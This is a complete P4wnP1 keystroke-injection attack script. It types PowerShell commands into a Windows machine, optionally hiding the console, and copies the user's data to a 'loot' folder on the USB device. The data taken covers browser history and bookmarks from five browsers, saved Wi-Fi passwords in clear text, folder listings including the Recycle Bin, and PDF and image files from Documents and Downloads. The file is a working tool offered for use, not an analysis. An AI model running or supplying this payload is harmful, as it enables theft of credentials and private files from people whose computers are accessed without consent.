/*#########################################################################################################################################\
# AllinOne_extraction.js														   #
# Extraction of browsing history/bookmarks/logs, folder/file structures, targeted files in specified folders and saved wifi Passwords      #
# Author: chriskalv                                                                                                                        #
#													                                   #                                                    #
# PREREQUISTES:                                                                                                                            #
# - Enable keyboard and USB mass storage capability on your P4wnP1.                                                                        #
# - Place browser_booty.exe in /tools in order to be able to extract browser data.                                                         #
# - Edit global settings below to your liking.                                                                                             #
##########################################################################################################################################*/


////////////////////////// GLOBAL SETTINGS /////////////////////////\
// GENERAL							   //
layout("de");			                                   // Keyboard layout
typingSpeed(1,4);		                                   // Typing = really fast
hide=false; 			                                   // Set to true to hide the console window on the target
exit=true;			                                   // Set to true to exit the console once finished
run_as_admin=false;					           // Set to true to execute powershell as Administrator.
extract_add_folder=false;                                          // Set to true to extract files from an additional (see "FILE EXTRACTION" settings below)
var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
// FILE EXTRACTION              				   //
var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory that should be inspected
var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory that should be inspected
var filetypes_user = ["pdf", "jpg", "png"]                         // The filetypes to extract from folders in the home directory
var add_folder = "SoftwareXYZ\\subfolder1\\subfolder2"             // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
// WIFI EXTRACTION						   //
var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German], "Key Content" [English])
////////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");                              // Hide the console if chosen to do so
    if (run_as_admin) {											// Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    }
    else {
        type("\n");
        delay(1000);
    }
  // Create paths
    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
    type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");                     
    type("$lootPathFolders = $usbPath+ '' +$lootfolder+ '\\folder_structure\';mkdir $lootPathFolders;");
    type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\browser_data\';mkdir $lootPathBrowser;");
    type("$lootPathWifi = $usbPath+ '' +$lootfolder+ '\\wifi_data\';mkdir $lootPathWifi;");
    if (extract_add_folder) type("$search_dir = Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath '" + add_folder + "';");  
    delay(100);
  
  // Get files/folder structure of Documents, Downloads, Pictures, Videos and Recycle Bin for current user
    type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $lootPathFolders\\$env:COMPUTERNAME_Documents.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $lootPathFolders\\$env:COMPUTERNAME_Pictures.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $lootPathFolders\\$env:COMPUTERNAME_Videos.txt;tree /F /A $env:USERPROFILE\\Downloads > $lootPathFolders\\$env:COMPUTERNAME_Downloads.txt; $shell = New-Object -com shell.application; $rb = $shell.Namespace(10); $items = @(); $items += $rb.items(); Write-Output '----------------Recycle Bin Start----------------', $items.name, Write-Output '----------------Recycle Bin End----------------' > $lootPathFolders\\$env:COMPUTERNAME_RecycleBin.txt\n");    
    delay(3000)

  // Get browsing history, bookmarks and download logs of all browsers
    // Copy Chrome, Brave, Edge, and Opera files to USB, as the orig. files are locked
    type('cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History" -Destination "$usbPath\\C_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History" -Destination "$usbPath\\B_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History" -Destination "$usbPath\\E_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\History" -Destination "$usbPath\\O_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\C_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\B_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\E_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks" -Destination "$usbPath\\O_Bookmarks"\n');
    // Copy Firefox seperately because it insists on being difficult
    type('cd $env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\; ls | Sort-Object -Property LastWriteTime | Select-Object -Last 1 | cd; cp -Path "places.sqlite" -Destination "$usbPath\\F_History"\n');
    // Execute the .exe in /tools folder
    type('cd $usbPath\\tools; .\\browser_booty.exe > $lootPathBrowser\\$env:COMPUTERNAME-HDB.txt\n');
    // Delete the database files now that we've extracted all useful information
    type('cd ..; rm * -Include *History; rm * -Include *Bookmarks\n') 
    delay(9000)
  
  // Extract Wifi information/keys
    type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");
    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
    delay(2000) 
   
  // Copy files of specified filetypes from specified folders (depth: 4 directories)
    type("$home_directory = Get-Variable HOME -valueOnly;");                                            // Get the home directory of the current user  
    for (var i = 0; i < filetypes_user.length; i++) {
        type("mkdir $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n");
        type("copy $home_directory\\" + user_subfolder1 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                              
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")    
    }  
    for (var i = 0; i < filetypes_user.length; i++) {
        type("mkdir $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n");
        type("copy $home_directory\\" + user_subfolder2 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                                 
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                              
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                             
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")  
    }
    if (extract_add_folder) {
        for (var i = 0; i < filetypes_addfolder.length; i++) {
            type("mkdir $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n");
            type("copy $search_dir\\*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                                 
            type("copy $search_dir\\*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                              
            type("copy $search_dir\\*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                             
            type("copy $search_dir\\*/*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n") 
        }
    }
	
  //Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();